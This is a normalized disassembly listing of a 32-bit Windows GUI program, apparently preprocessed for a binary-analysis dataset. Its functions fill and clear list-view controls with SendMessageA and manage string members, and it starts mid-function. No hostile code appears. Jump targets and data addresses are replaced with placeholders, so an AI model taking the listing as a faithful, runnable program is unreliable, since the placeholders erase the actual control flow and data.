lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x4
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0xd0 ] 0xd
push eax
lea ecx [ esp + 0xc8 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x7
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x2
call sub_442148
mov [ esp + 0xd0 ] 0x1
jmp r-xdata
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x1d
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x1c
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x1b
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x1a
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x19
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x18
call sub_442148
mov [ esp + 0xd0 ] 0x17
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push ebx
lea edx [ esp + 0x18 ]
push edi
push edx
mov ecx esi
mov [ esp + 0xdc ] 0xe
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xdc ] 0xf
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xd0 ] 0xe
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xd0 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc8 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc4
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1bc ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0xc4 ]
lea ecx [ ebp + 0x1b8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx ebp
call sub_4065d0
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x16
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x15
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x14
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x13
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x12
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x11
call sub_442148
mov [ esp + 0xd0 ] 0x10
jmp r-xdata
sub_406f50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45cc70
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_4065d0
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_407050
push 0xffffffff
push sub_45cd94
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb8
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_407500
push 0x1
mov ecx ebp
mov [ esp + 0xd4 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x5
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0xc
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x4
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0xd0 ] 0xd
push eax
lea ecx [ esp + 0xc8 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x7
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x2
call sub_442148
mov [ esp + 0xd0 ] 0x1
jmp r-xdata
mov eax [ esp + 0xdc ]
mov [ eax ] ebx
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x1d
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x1c
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x1b
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x1a
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x19
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x18
call sub_442148
mov [ esp + 0xd0 ] 0x17
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push ebx
lea edx [ esp + 0x18 ]
push edi
push edx
mov ecx esi
mov [ esp + 0xdc ] 0xe
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xdc ] 0xf
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xd0 ] 0xe
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xd0 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc8 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc4
retn 0x8
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1bc ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0xc4 ]
lea ecx [ ebp + 0x1b8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx ebp
call sub_4065d0
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x16
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x15
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x14
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0x13
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0x12
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x11
call sub_442148
mov [ esp + 0xd0 ] 0x10
jmp r-xdata
sub_407500
push 0xffffffff
push sub_45ce07
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x9b
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x98 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x9c ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0xa0 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0xa4 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0xa8 ] edx
mov eax [ rw-data ]
mov [ esi + 0xac ] eax
push rw-data
mov [ esp + 0x20 ] 0x7
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0xa8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0xac ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_407630
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3ec
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ec
push edi
call sub_449495
lea edx [ esi + 0x9c ]
push edx
push 0x425
push edi
call sub_4493f1
lea eax [ esi + 0xa0 ]
push eax
push 0x427
push edi
call sub_4493f1
lea ecx [ esi + 0xa4 ]
push ecx
push 0x3ea
push edi
call sub_4493f1
lea edx [ esi + 0xa8 ]
push edx
push 0x3ed
push edi
call sub_4493f1
add esi 0xac
push esi
push 0x3ee
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_4076d0
push 0xffffffff
push sub_45ce91
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x128
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a470
push 0x0
push rw-data
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xcc ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x6
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x1
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
xor eax eax
pop esi
mov ecx [ esp + 0x128 ]
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
lea ecx [ esp + 0x4 ]
call sub_421900
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0xa
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x9
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x8
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x7
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esp + 0x118 ]
mov ecx [ esi + 0x78 ]
push eax
push 0x0
push 0x143
push ecx
call edi
mov edx [ esp + 0x8 ]
push 0x1
push 0x1
lea ecx [ esp + 0x10 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd0 ]
test eax eax
je r-xdata
pop edi
sub_4078e0
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x9c ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x98 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0xa4 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_407960
push 0xffffffff
push sub_45cefc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_407a90
push 0xffffffff
push sub_45cf5e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_407b60
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x124
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_407c20
push 0xffffffff
push sub_45cf83
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x9c
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_409060
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_407cc0
push 0xffffffff
push sub_45cfe3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_407d90
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x78
push 0x4
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
mov ecx esi
call sub_407e70
mov eax 0x1
pop edi
pop esi
retn
sub_407e70
push 0xffffffff
push sub_45cff8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push ecx
push 0xffffffff
mov ecx ebp
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1a8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_407fd0
push 0xffffffff
push sub_45d08c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
mov eax [ rw-data ]
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc4 ] 0x0
call sub_408c30
mov [ esp + 0xc0 ] 0x1
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc0 ] 0xd
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc0 ] 0xc
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc0 ] 0xb
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc0 ] 0xa
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc0 ] 0x9
call sub_442148
mov [ esp + 0xc0 ] 0x8
mov ecx [ esp + 0xa8 ]
lea edx [ esp + 0x8 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x14 ]
mov eax [ edi + 0x98 ]
add esp 0xc
lea esi [ edi + 0x98 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc0 ] 0x7
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc0 ] 0x6
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc0 ] 0x5
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc0 ] 0x4
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc0 ] 0x3
call sub_442148
mov [ esp + 0xc0 ] 0x2
jmp r-xdata
mov eax [ edi + 0x134 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0xc0 ] 0x0
call sub_43da87
lea ecx [ esp + 0x8 ]
mov [ esp + 0xc0 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xb8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xbc
retn
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0xb0 ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xac ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xb4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xa4 ]
push ecx
lea ecx [ edi + 0x1b0 ]
call sub_442281
lea edx [ esp + 0xa8 ]
lea ecx [ edi + 0x1a8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx edi
call sub_407e70
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
sub_408240
push 0xffffffff
push sub_45d0eb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4082e0
push 0xffffffff
push sub_45d1f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push ebx
push ebp
